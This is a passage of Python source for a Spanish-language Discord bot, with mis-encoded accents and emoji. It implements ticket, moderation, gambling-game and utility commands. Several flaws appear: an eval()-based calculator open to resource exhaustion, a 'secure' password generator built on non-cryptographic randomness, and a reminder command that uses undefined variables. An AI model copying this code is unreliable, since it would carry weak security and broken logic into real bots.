                  interaction.user.guild_permissions.administrator)
  
  # Extraer el ID del usuario del nombre del canal
  channel_parts = channel.name.split('-')
  if len(channel_parts) >= 3:
      ticket_user_id = channel_parts[-1]
      is_ticket_owner = str(interaction.user.id) == ticket_user_id
  else:
      is_ticket_owner = False

  if not (is_moderator or is_ticket_owner):
      await interaction.response.send_message(
          "‚ùå Solo el creador del ticket o los moderadores pueden cerrarlo.",
          ephemeral=True)
      return

  # Confirmar cierre
  embed = discord.Embed(
      title="‚ö†Ô∏è Confirmar Cierre",
      description="¬øEst√°s seguro de que quieres cerrar este ticket?\n\n**Esta acci√≥n no se puede deshacer.**",
      color=discord.Color.orange())

  confirm_view = ConfirmCloseView()
  await interaction.response.send_message(embed=embed, view=confirm_view, ephemeral=True)


@bot.tree.command(name="tadd", description="A√±adir nueva categor√≠a de ticket")
@discord.app_commands.describe(name="Nombre de la categor√≠a",
                            description="Descripci√≥n de la categor√≠a",
                            color="Color (blue, red, green, etc.)")
async def ticket_add_category(interaction: discord.Interaction, name: str, description: str, color: str = "blue"):
  if not interaction.user.guild_permissions.manage_channels:
      await interaction.response.send_message(
          "‚ùå Necesitas permisos de **Administrar Canales**.", ephemeral=True)
      return

  guild_id = str(interaction.guild.id)
  categories = get_guild_categories(guild_id)

  # Generar ID √∫nico para la categor√≠a
  category_id = name.lower().replace(" ", "_")

  if category_id in categories:
      await interaction.response.send_message(
          f"‚ùå Ya existe una categor√≠a con el nombre '{name}'.", ephemeral=True)
      return

  categories[category_id] = {
      "name": f"üé´ {name}",
      "color": color,
      "description": description
  }

  save_ticket_categories()

  embed = discord.Embed(
      title="‚úÖ Categor√≠a A√±adida",
      description=f"Se ha a√±adido la categor√≠a **{name}** exitosamente.",
      color=discord.Color.green()
  )
  embed.add_field(name="üìù Descripci√≥n", value=description, inline=False)
  embed.add_field(name="üé® Color", value=color, inline=True)

  await interaction.response.send_message(embed=embed)

  # Actualizar todos los paneles de tickets
  try:
      await update_all_ticket_panels(interaction.guild)
  except Exception as e:
      print(f"Error actualizando paneles tras a√±adir categor√≠a: {e}")


@bot.tree.command(name="tedit", description="Editar categor√≠a de ticket existente")
@discord.app_commands.describe(category_id="ID de la categor√≠a a editar",
                            name="Nuevo nombre (opcional)",
                            description="Nueva descripci√≥n (opcional)",
                            color="Nuevo color (opcional)")
async def ticket_edit_category(interaction: discord.Interaction, category_id: str,
                            name: str = None, description: str = None, color: str = None):
  if not interaction.user.guild_permissions.manage_channels:
      await interaction.response.send_message(
          "‚ùå Necesitas permisos de **Administrar Canales**.", ephemeral=True)
      return

  guild_id = str(interaction.guild.id)
  categories = get_guild_categories(guild_id)

  if category_id not in categories:
      await interaction.response.send_message(
          f"‚ùå No existe una categor√≠a con ID '{category_id}'.", ephemeral=True)
      return

  category = categories[category_id]

  if name:
      category["name"] = f"üé´ {name}"
  if description:
      category["description"] = description
  if color:
      category["color"] = color

  save_ticket_categories()

  embed = discord.Embed(
      title="‚úÖ Categor√≠a Editada",
      description=f"Se ha editado la categor√≠a **{category_id}** exitosamente.",
      color=discord.Color.blue()
  )
  embed.add_field(name="üìõ Nombre", value=category["name"], inline=True)
  embed.add_field(name="üìù Descripci√≥n", value=category["description"], inline=False)
  embed.add_field(name="üé® Color", value=category["color"], inline=True)

  await interaction.response.send_message(embed=embed)

  # Actualizar todos los paneles de tickets
  try:
      await update_all_ticket_panels(interaction.guild)
  except Exception as e:
      print(f"Error actualizando paneles tras editar categor√≠a: {e}")


@bot.tree.command(name="tremove", description="Eliminar categor√≠a de ticket")
@discord.app_commands.describe(category_id="ID de la categor√≠a a eliminar")
async def ticket_remove_category(interaction: discord.Interaction, category_id: str):
  if not interaction.user.guild_permissions.manage_channels:
      await interaction.response.send_message(
          "‚ùå Necesitas permisos de **Administrar Canales**.", ephemeral=True)
      return

  guild_id = str(interaction.guild.id)
  categories = get_guild_categories(guild_id)

  if category_id not in categories:
      await interaction.response.send_message(
          f"‚ùå No existe una categor√≠a con ID '{category_id}'.", ephemeral=True)
      return

  # No permitir eliminar categor√≠as b√°sicas
  if category_id in ["general", "bugs", "suggestions", "other"]:
      await interaction.response.send_message(
          f"‚ùå No puedes eliminar la categor√≠a b√°sica '{category_id}'.", ephemeral=True)
      return

  category_name = categories[category_id]["name"]
  del categories[category_id]
  save_ticket_categories()

  embed = discord.Embed(
      title="‚úÖ Categor√≠a Eliminada",
      description=f"Se ha eliminado la categor√≠a **{category_name}** exitosamente.",
      color=discord.Color.red()
  )

  await interaction.response.send_message(embed=embed)

  # Actualizar todos los paneles de tickets
  try:
      await update_all_ticket_panels(interaction.guild)
  except Exception as e:
      print(f"Error actualizando paneles tras eliminar categor√≠a: {e}")


# ================================
# COMANDOS DE UTILIDAD ADICIONALES
# ================================


@bot.tree.command(name='clear', description='Eliminar mensajes del canal')
@discord.app_commands.describe(amount="N√∫mero de mensajes a eliminar (1-100)")
async def clear_messages(interaction: discord.Interaction, amount: int):
  if not interaction.user.guild_permissions.manage_messages:
      await interaction.response.send_message(
          "‚ùå Necesitas permisos de **Administrar Mensajes**.",
          ephemeral=True)
      return

  if amount < 1 or amount > 100:
      await interaction.response.send_message(
          "‚ùå Puedes eliminar entre 1 y 100 mensajes.", ephemeral=True)
      return

  await interaction.response.defer()

  try:
      deleted = await interaction.channel.purge(limit=amount)
      embed = discord.Embed(
          title="üóëÔ∏è Mensajes Eliminados",
          description=f"Se eliminaron **{len(deleted)}** mensajes.",
          color=discord.Color.green())
      await interaction.followup.send(embed=embed, delete_after=10)
  except Exception as e:
      await interaction.response.send_message(
          f"‚ùå Error al eliminar mensajes: {str(e)}", ephemeral=True)


@bot.tree.command(name='userinfo', description='Ver informaci√≥n de un usuario')
@discord.app_commands.describe(user="Usuario del que ver la informaci√≥n")
async def user_info(interaction: discord.Interaction,
                  user: discord.Member = None):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  target = user or interaction.user

  embed = discord.Embed(title=f"üë§ Informaci√≥n de {target.display_name}",
                      color=target.color if target.color
                      != discord.Color.default() else discord.Color.blue())
  embed.set_thumbnail(url=target.display_avatar.url)

  # Informaci√≥n b√°sica
  embed.add_field(name="üìõ Nombre",
                  value=f"{target.name}#{target.discriminator}",
                  inline=True)
  embed.add_field(name="üÜî ID", value=target.id, inline=True)
  embed.add_field(name="ü§ñ Bot",
                  value="‚úÖ" if target.bot else "‚ùå",
                  inline=True)

  # Fechas
  embed.add_field(name="üìÖ Cuenta creada",
                  value=f"<t:{int(target.created_at.timestamp())}:R>",
                  inline=True)
  embed.add_field(name="üì• Se uni√≥ al servidor",
                  value=f"<t:{int(target.joined_at.timestamp())}:R>",
                  inline=True)

  # Roles
  roles = [role.mention for role in target.roles[1:]]  # Excluir @everyone
  embed.add_field(name=f"üè∑Ô∏è Roles ({len(roles)})",
                  value=" ".join(roles[:5]) +
                  (f" y {len(roles)-5} m√°s..." if len(roles) > 5 else "")
                  if roles else "Ninguno",
                  inline=False)

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='poll', description='Crear una encuesta')
@discord.app_commands.describe(question="Pregunta de la encuesta",
                             option1="Primera opci√≥n",
                             option2="Segunda opci√≥n",
                             option3="Tercera opci√≥n (opcional)",
                             option4="Cuarta opci√≥n (opcional)")
async def create_poll(interaction: discord.Interaction,
                    question: str,
                    option1: str,
                    option2: str,
                    option3: str = None,
                    option4: str = None):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  options = [option1, option2]
  if option3: options.append(option3)
  if option4: options.append(option4)

  embed = discord.Embed(
      title="üìä Encuesta",
      description=f"**{question}**",
      color=discord.Color.blue())

  reactions = ['1Ô∏è‚É£', '2Ô∏è‚É£', '3Ô∏è‚É£', '4Ô∏è‚É£']
  description = ""
  for i, option in enumerate(options):
      description += f"\n{reactions[i]} {option}"

  embed.add_field(name="Opciones:", value=description, inline=False)
  embed.set_footer(
      text=f"Encuesta creada por {interaction.user.display_name}")

  await interaction.response.send_message(embed=embed)
  message = await interaction.original_response()

  # A√±adir reacciones
  for i in range(len(options)):
      await message.add_reaction(reactions[i])


@bot.command(name='coinflip', aliases=['cf'])
async def coinflip_command(ctx, bet: int = None):
  """Juego de cara o cruz con apuestas"""
  if not bet:
      await ctx.send("‚ùå Uso: `.coinflip cantidad`\n**Ejemplo:** `.coinflip 1000`")
      return

  if bet <= 0:
      await ctx.send("‚ùå La apuesta debe ser mayor a 0.")
      return

  user_balance = get_balance(ctx.author.id)
  if user_balance['wallet'] < bet:
      await ctx.send(f"‚ùå No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
      return

  # Cobrar la apuesta
  update_balance(ctx.author.id, -bet, 0)

  # Lanzar moneda
  result = random.choice(["cara", "cruz"])
  user_choice = random.choice(["cara", "cruz"])  # Simular elecci√≥n del usuario

  if result == user_choice:
      # Gan√≥ - devolver apuesta + ganancia
      winnings = bet * 2
      update_balance(ctx.author.id, winnings, 0)

      embed = discord.Embed(title="ü™ô Coinflip - ¬°GANASTE!", color=discord.Color.green())
      embed.add_field(name="üéØ Resultado", value=f"Sali√≥ {result.upper()}", inline=True)
      embed.add_field(name="üí∞ Apostaste", value=f"${bet:,}", inline=True)
      embed.add_field(name="üèÜ Ganaste", value=f"${winnings:,}", inline=True)
  else:
      # Perdi√≥
      embed = discord.Embed(title="ü™ô Coinflip - Perdiste", color=discord.Color.red())
      embed.add_field(name="üéØ Resultado", value=f"Sali√≥ {result.upper()}", inline=True)
      embed.add_field(name="üí∏ Perdiste", value=f"${bet:,}", inline=True)
      embed.add_field(name="üçÄ Suerte", value="¬°Int√©ntalo de nuevo!", inline=True)

  await ctx.send(embed=embed)

@bot.command(name='slots', aliases=['sl'])
async def slots_command(ctx, bet: int = None):
  """M√°quina tragamonedas"""
  if not bet:
      await ctx.send("‚ùå Uso: `.slots cantidad`\n**Ejemplo:** `.slots 500`")
      return

  if bet <= 0:
      await ctx.send("‚ùå La apuesta debe ser mayor a 0.")
      return

  user_balance = get_balance(ctx.author.id)
  if user_balance['wallet'] < bet:
      await ctx.send(f"‚ùå No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
      return

  # Cobrar la apuesta
  update_balance(ctx.author.id, -bet, 0)

  # S√≠mbolos de la m√°quina
  symbols = ["üçí", "üçã", "üçä", "üçá", "üîî", "üíé", "7Ô∏è‚É£"]

  # Generar resultado
  slot1 = random.choice(symbols)
  slot2 = random.choice(symbols)
  slot3 = random.choice(symbols)

  # Calcular ganancia
  winnings = 0

  if slot1 == slot2 == slot3:
      if slot1 == "üíé":
          winnings = bet * 10  # Jackpot
      elif slot1 == "7Ô∏è‚É£":
          winnings = bet * 8
      elif slot1 == "üîî":
          winnings = bet * 6
      else:
          winnings = bet * 4
  elif slot1 == slot2 or slot2 == slot3 or slot1 == slot3:
      winnings = bet * 2  # Par

  if winnings > 0:
      update_balance(ctx.author.id, winnings, 0)
      embed = discord.Embed(title="üé∞ Slots - ¬°GANASTE!", color=discord.Color.gold())
      embed.add_field(name="üé≤ Resultado", value=f"{slot1} {slot2} {slot3}", inline=False)
      embed.add_field(name="üí∞ Apostaste", value=f"${bet:,}", inline=True)
      embed.add_field(name="üèÜ Ganaste", value=f"${winnings:,}", inline=True)

      if slot1 == slot2 == slot3 == "üíé":
          embed.add_field(name="üéâ ¬°JACKPOT!", value="üíéüíéüíé", inline=False)
  else:
      embed = discord.Embed(title="üé∞ Slots - Sin suerte", color=discord.Color.red())
      embed.add_field(name="üé≤ Resultado", value=f"{slot1} {slot2} {slot3}", inline=False)
      embed.add_field(name="üí∏ Perdiste", value=f"${bet:,}", inline=True)
      embed.add_field(name="üçÄ Suerte", value="¬°Int√©ntalo de nuevo!", inline=True)

  await ctx.send(embed=embed)

@bot.command(name='blackjack', aliases=['bj'])
async def blackjack_command(ctx, bet: int = None):
  """Juego de Blackjack simplificado"""
  if not bet:
      await ctx.send("‚ùå Uso: `.blackjack cantidad`\n**Ejemplo:** `.blackjack 1000`")
      return

  if bet <= 0:
      await ctx.send("‚ùå La apuesta debe ser mayor a 0.")
      return

  user_balance = get_balance(ctx.author.id)
  if user_balance['wallet'] < bet:
      await ctx.send(f"‚ùå No tienes suficiente dinero. Tienes ${user_balance['wallet']:,}")
      return

  # Cobrar la apuesta
  update_balance(ctx.author.id, -bet, 0)

  # Generar cartas (simplificado)
  def get_card_value():
      return random.randint(1, 11)

  def get_hand_total(cards):
      total = sum(cards)
      # Ajustar Ases si es necesario
      aces = cards.count(11)
      while total > 21 and aces:
          total -= 10
          aces -= 1
      return total

  # Repartir cartas iniciales
  player_cards = [get_card_value(), get_card_value()]
  dealer_cards = [get_card_value(), get_card_value()]

  player_total = get_hand_total(player_cards)
  dealer_total = get_hand_total(dealer_cards)

  # L√≥gica simplificada del dealer
  while dealer_total < 17:
      dealer_cards.append(get_card_value())
      dealer_total = get_hand_total(dealer_cards)

  # Determinar ganador
  winnings = 0
  result = ""

  if player_total > 21:
      result = "Te pasaste de 21"
  elif dealer_total > 21:
      result = "El dealer se pas√≥"
      winnings = bet * 2
  elif player_total == 21 and len(player_cards) == 2:
      result = "¬°BLACKJACK!"
      winnings = int(bet * 2.5)
  elif player_total > dealer_total:
      result = "¬°Ganaste!"
      winnings = bet * 2
  elif player_total == dealer_total:
      result = "Empate"
      winnings = bet  # Devolver apuesta
  else:
      result = "Perdiste"

  if winnings > 0:
      update_balance(ctx.author.id, winnings, 0)

  # Crear embed
  if winnings > bet:
      embed = discord.Embed(title="‚ô†Ô∏è Blackjack - ¬°GANASTE!", color=discord.Color.green())
  elif winnings == bet:
      embed = discord.Embed(title="‚ô†Ô∏è Blackjack - Empate", color=discord.Color.orange())
  else:
      embed = discord.Embed(title="‚ô†Ô∏è Blackjack - Perdiste", color=discord.Color.red())

  embed.add_field(name="üÉè Tus cartas", value=f"Total: {player_total}", inline=True)
  embed.add_field(name="üé∞ Dealer", value=f"Total: {dealer_total}", inline=True)
  embed.add_field(name="üéØ Resultado", value=result, inline=False)
  embed.add_field(name="üí∞ Apostaste", value=f"${bet:,}", inline=True)

  if winnings > 0:
      embed.add_field(name="üèÜ Recibiste", value=f"${winnings:,}", inline=True)

  await ctx.send(embed=embed)


# ================================
# COMANDOS DE DIVERSI√ìN ADICIONALES
# ================================


@bot.tree.command(name='meme', description='Obtener un meme aleatorio')
async def get_meme(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  memes = [
      "https://i.imgur.com/XyLOD.jpg", "https://i.imgur.com/fPUUf.jpg",
      "https://i.imgur.com/dQaJk.jpg"
  ]

  embed = discord.Embed(title="üòÇ Meme Aleatorio",
                      color=discord.Color.random())
  embed.set_image(url=random.choice(memes))

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='8ball', description='Pregunta a la bola m√°gica')
@discord.app_commands.describe(question="Tu pregunta")
async def eight_ball(interaction: discord.Interaction, question: str):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  responses = [
      "üé± Es cierto.", "üé± Es decididamente as√≠.", "üé± Sin duda.",
      "üé± S√≠, definitivamente.", "üé± Puedes confiar en ello.",
      "üé± Como yo lo veo, s√≠.", "üé± Muy probable.",
      "üé± Las perspectivas son buenas.", "üé± S√≠.",
      "üé± Las se√±ales apuntan a que s√≠.",
      "üé± Respuesta confusa, intenta de nuevo.",
      "üé± Pregunta de nuevo m√°s tarde.", "üé± Mejor no te lo digo ahora.",
      "üé± No puedo predecirlo ahora.", "üé± Conc√©ntrate y pregunta de nuevo.",
      "üé± No cuentes con ello.", "üé± Mi respuesta es no.",
      "üé± Mis fuentes dicen que no.", "üé± Las perspectivas no son tan buenas.",
      "üé± Muy dudoso."
  ]

  embed = discord.Embed(
      title="üé± Bola M√°gica",
      description=f"**Pregunta:** {question}\n\n**Respuesta:** {random.choice(responses)}",
      color=discord.Color.purple())

  await interaction.response.send_message(embed=embed)


# ================================
# COMANDOS DE UTILIDAD ADICIONALES
# ================================

@bot.tree.command(name='avatar', description='Ver el avatar de un usuario')
@discord.app_commands.describe(user="Usuario del que ver el avatar")
async def avatar_command(interaction: discord.Interaction, user: discord.Member = None):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  target = user or interaction.user

  embed = discord.Embed(
      title=f"üñºÔ∏è Avatar de {target.display_name}",
      color=target.color if target.color != discord.Color.default() else discord.Color.blue())

  embed.set_image(url=target.display_avatar.url)
  embed.add_field(name="üîó Enlace directo",
                  value=f"[Descargar]({target.display_avatar.url})",
                  inline=False)

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='math', description='Calculadora b√°sica')
@discord.app_commands.describe(expression="Expresi√≥n matem√°tica (ej: 2+2, 10*5, sqrt(16))")
async def math_command(interaction: discord.Interaction, expression: str):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  try:
      # Reemplazar funciones comunes
      expression = expression.replace("sqrt", "**0.5")
      expression = expression.replace("^", "**")

      # Evaluaci√≥n segura solo con operadores matem√°ticos b√°sicos
      allowed_chars = "0123456789+-*/.() "
      if all(c in allowed_chars for c in expression):
          result = eval(expression)

          embed = discord.Embed(
              title="üî¢ Calculadora",
              color=discord.Color.green())
          embed.add_field(name="üìù Expresi√≥n", value=f"`{expression}`", inline=False)
          embed.add_field(name="‚úÖ Resultado", value=f"`{result}`", inline=False)

          await interaction.response.send_message(embed=embed)
      else:
          await interaction.response.send_message(
              "‚ùå Solo se permiten n√∫meros y operadores matem√°ticos b√°sicos (+, -, *, /, (), sqrt)",
              ephemeral=True)
  except Exception as e:
      await interaction.response.send_message(
          f"‚ùå Error en la expresi√≥n matem√°tica: {str(e)}", ephemeral=True)


@bot.tree.command(name='weather', description='Informaci√≥n meteorol√≥gica simulada')
@discord.app_commands.describe(city="Ciudad (simulaci√≥n)")
async def weather_command(interaction: discord.Interaction, city: str):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  # Simulaci√≥n de datos meteorol√≥gicos
  temperatures = list(range(-5, 35))
  conditions = ["‚òÄÔ∏è Soleado", "‚õÖ Parcialmente nublado", "‚òÅÔ∏è Nublado",
             "üåßÔ∏è Lluvioso", "‚õàÔ∏è Tormentoso", "üå®Ô∏è Nevando"]

  temp = random.choice(temperatures)
  condition = random.choice(conditions)
  humidity = random.randint(30, 90)
  wind_speed = random.randint(5, 25)

  embed = discord.Embed(
      title=f"üå§Ô∏è Clima en {city.title()}",
      description=f"**{condition}**",
      color=discord.Color.blue())

  embed.add_field(name="üå°Ô∏è Temperatura", value=f"{temp}¬∞C", inline=True)
  embed.add_field(name="üí® Viento", value=f"{wind_speed} km/h", inline=True)
  embed.add_field(name="üíß Humedad", value=f"{humidity}%", inline=True)
  embed.set_footer(text="‚ö†Ô∏è Datos simulados - No reales")

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='reminder', description='Crear un recordatorio')
@discord.app_commands.describe(time="Tiempo en minutos", message="Mensaje del recordatorio")
async def reminder_command(interaction: discord.Interaction, time: int, message: str):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  if time <= 0 or time > 1440:  # M√°ximo 24 horas
      await interaction.response.send_message(
          "‚ùå El tiempo debe ser entre 1 minuto y 1440 minutos (24 horas).",
          ephemeral=True)
      return

  end_time = datetime.datetime.utcnow() + datetime.timedelta(minutes=time)

  embed = discord.Embed(
      title="‚è∞ Recordatorio Establecido",
      description=f"Te recordar√© en **{time} minutos**",
      color=discord.Color.blue())
  embed.add_field(name="üìù Mensaje", value=message, inline=False)
  embed.add_field(name="üïê Te recordar√©", value=f"<t:{int(end_time.timestamp())}:R>", inline=False)

  await interaction.response.send_message(embed=embed)

  # Esperar y enviar recordatorio
  await asyncio.sleep(time * 60)

  # Verificar si el temporizador sigue activo
  if timer_id in active_timers:
      timer_data = active_timers[timer_id]

      try:
          # Crear embed de notificaci√≥n
          notification_embed = discord.Embed(
              title="üîî ¬°RECORDATORIO!",
              description=message,
              color=discord.Color.orange())
          notification_embed.add_field(name="‚è±Ô∏è Duraci√≥n",
                                     value=f"{time} minutos",
                                     inline=True)
          notification_embed.set_footer(text=f"Recordatorio de hace {time} minutos")

          # Mencionar al usuario
          channel = bot.get_channel(timer_data['channel_id'])
          if channel:
              user = bot.get_user(timer_data['user_id'])
              user_mention = user.mention if user else f"<@{timer_data['user_id']}>"
              await channel.send(f"üîî {user_mention}",
                               embed=notification_embed)

          # Limpiar del registro
          del active_timers[timer_id]

      except Exception as e:
          print(f"Error al enviar notificaci√≥n de temporizador: {e}")
          # Limpiar del registro incluso si hay error
          if timer_id in active_timers:
              del active_timers[timer_id]


@bot.tree.command(name='flip', description='Lanzar una moneda')
async def flip_command(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  result = random.choice(["ü™ô Cara", "üîÑ Cruz"])

  embed = discord.Embed(
      title="ü™ô Lanzamiento de Moneda",
      description=f"**Resultado: {result}**",
      color=discord.Color.gold())

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='dice', description='Lanzar dados')
@discord.app_commands.describe(sides="N√∫mero de caras del dado (por defecto 6)", count="Cantidad de dados (por defecto 1)")
async def dice_command(interaction: discord.Interaction, sides: int = 6, count: int = 1):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  if sides < 2 or sides > 100:
      await interaction.response.send_message(
          "‚ùå El dado debe tener entre 2 y 100 caras.", ephemeral=True)
      return

  if count < 1 or count > 10:
      await interaction.response.send_message(
          "‚ùå Puedes lanzar entre 1 y 10 dados.", ephemeral=True)
      return

  results = [random.randint(1, sides) for _ in range(count)]
  total = sum(results)

  embed = discord.Embed(
      title=f"üé≤ Lanzamiento de Dados (d{sides})",
      color=discord.Color.red())

  embed.add_field(name="üéØ Resultados",
               value=" | ".join([f"**{r}**" for r in results]),
               inline=False)
  embed.add_field(name="üìä Total", value=f"**{total}**", inline=True)
  embed.add_field(name="üìà Promedio", value=f"**{total/count:.1f}**", inline=True)

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='password', description='Generar contrase√±a segura')
@discord.app_commands.describe(length="Longitud de la contrase√±a (8-50)")
async def password_command(interaction: discord.Interaction, length: int = 12):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  if length < 8 or length > 50:
      await interaction.response.send_message(
          "‚ùå La longitud debe ser entre 8 y 50 caracteres.", ephemeral=True)
      return

  import string
  chars = string.ascii_letters + string.digits + "!@#$%^&*"
  password = ''.join(random.choice(chars) for _ in range(length))

  embed = discord.Embed(
      title="üîê Contrase√±a Generada",
      description=f"```{password}```",
      color=discord.Color.green())
  embed.add_field(name="üìè Longitud", value=f"{length} caracteres", inline=True)
  embed.add_field(name="üîí Seguridad", value="Alta", inline=True)
  embed.set_footer(text="‚ö†Ô∏è Guarda esta contrase√±a en un lugar seguro")

  await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name='quote', description='Cita inspiradora aleatoria')
async def quote_command(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  quotes = [
      ("La vida es lo que ocurre mientras est√°s ocupado haciendo otros planes.", "John Lennon"),
      ("El √∫nico modo de hacer un gran trabajo es amar lo que haces.", "Steve Jobs"),
      ("La imaginaci√≥n es m√°s importante que el conocimiento.", "Albert Einstein"),
      ("El √©xito es ir de fracaso en fracaso sin perder el entusiasmo.", "Winston Churchill"),
      ("La imaginaci√≥n es m√°s importante que el conocimiento.", "Albert Einstein"),
      ("No puedes conectar los puntos mirando hacia adelante.", "Steve Jobs"),
      ("La √∫nica forma de hacer algo bien es hacerlo con pasi√≥n.", "An√≥nimo"),
      ("El fracaso es simplemente la oportunidad de comenzar de nuevo.", "Henry Ford"),
      ("Tu tiempo es limitado, no lo malgastes viviendo la vida de otro.", "Steve Jobs"),
      ("La diferencia entre lo ordinario y lo extraordinario es ese peque√±o extra.", "Jimmy Johnson")
  ]

  quote_text, author = random.choice(quotes)

  embed = discord.Embed(
      title="üí≠ Cita Inspiradora",
      description=f"*\"{quote_text}\"*",
      color=discord.Color.purple())
  embed.set_footer(text=f"‚Äî {author}")

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='translate', description='Traductor simulado')
@discord.app_commands.describe(text="Texto a traducir", target_lang="Idioma objetivo")
async def translate_command(interaction: discord.Interaction, text: str, target_lang: str):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  # Simulaci√≥n de traducci√≥n
  translations = {
      "english": f"[EN] {text} (translated)",
      "spanish": f"[ES] {text} (traducido)",
      "french": f"[FR] {text} (traduit)",
      "german": f"[DE] {text} (√ºbersetzt)",
      "italian": f"[IT] {text} (tradotto)",
      "portuguese": f"[PT] {text} (traduzido)"
  }

  target = target_lang.lower()
  if target in translations:
      result = translations[target]
  else:
      result = f"[{target_lang.upper()}] {text} (simulated translation)"

  embed = discord.Embed(
      title="üåê Traductor",
      color=discord.Color.blue())
  embed.add_field(name="üìù Original", value=text, inline=False)
  embed.add_field(name="üîÑ Traducido", value=result, inline=False)
  embed.add_field(name="üéØ Idioma", value=target_lang.title(), inline=True)
  embed.set_footer(text="‚ö†Ô∏è Traducci√≥n simulada - No real")

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='joke', description='Contar un chiste aleatorio')
async def joke_command(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  jokes = [
      "¬øPor qu√© los programadores prefieren el modo oscuro? Porque la luz atrae a los bugs! üêõ",
      "¬øC√≥mo se llama un boomerang que no vuelve? Un palo. ü™É",
      "¬øPor qu√© los p√°jaros vuelan hacia el sur en invierno? Porque es muy lejos para caminar. üê¶",
      "¬øQu√© le dice un taco a otro taco? ¬øQuieres que salgamos esta noche? üåÆ",
      "¬øPor qu√© los desarrolladores odian la naturaleza? Tiene demasiados bugs. üåø",
      "¬øQu√© hace una abeja en el gimnasio? ¬°Zum-ba! üêù"
  ]

  joke = random.choice(jokes)

  embed = discord.Embed(
      title="üòÇ Chiste del D√≠a",
      description=joke,
      color=discord.Color.orange())

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='color', description='Generar un color aleatorio')
async def color_command(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  # Generar color aleatorio
  color_int = random.randint(0, 16777215)  # 0xFFFFFF
  hex_color = f"#{color_int:06x}".upper()

  # Valores RGB
  r = (color_int >> 16) & 255
  g = (color_int >> 8) & 255
  b = color_int & 255

  embed = discord.Embed(
      title="üé® Color Aleatorio",
      color=discord.Color(color_int))

  embed.add_field(name="üî¢ HEX", value=f"`{hex_color}`", inline=True)
  embed.add_field(name="üåà RGB", value=f"`({r}, {g}, {b})`", inline=True)
  embed.add_field(name="üéØ Decimal", value=f"`{color_int}`", inline=True)

  # Cuadrado de color simulado
  embed.add_field(name="üé® Vista Previa",
               value="El color se muestra en el borde de este embed",
               inline=False)

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='base64', description='Codificar/decodificar texto en Base64')
@discord.app_commands.describe(action="encode o decode", text="Texto a procesar")
async def base64_command(interaction: discord.Interaction, action: str, text: str):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  try:
      import base64

      if action.lower() == "encode":
          encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')

          embed = discord.Embed(
              title="üîê Base64 Encoder",
              color=discord.Color.green())
          embed.add_field(name="üìù Original", value=f"```{text}```", inline=False)
          embed.add_field(name="üîí Codificado", value=f"```{encoded}```", inline=False)

      elif action.lower() == "decode":
          try:
              decoded = base64.b64decode(text.encode('utf-8')).decode('utf-8')

              embed = discord.Embed(
                  title="üîì Base64 Decoder",
                  color=discord.Color.blue())
              embed.add_field(name="üîí Codificado", value=f"```{text}```", inline=False)
              embed.add_field(name="üìù Decodificado", value=f"```{decoded}```", inline=False)
          except:
              await interaction.response.send_message(
                  "‚ùå El texto no es v√°lido en Base64.", ephemeral=True)
              return
      else:
          await interaction.response.send_message(
              "‚ùå Acci√≥n debe ser 'encode' o 'decode'.", ephemeral=True)
          return

      await interaction.response.send_message(embed=embed)

  except Exception as e:
      await interaction.response.send_message(
          f"‚ùå Error procesando Base64: {str(e)}", ephemeral=True)


@bot.tree.command(name='uptime', description='Ver tiempo de actividad del bot')
async def uptime_command(interaction: discord.Interaction):
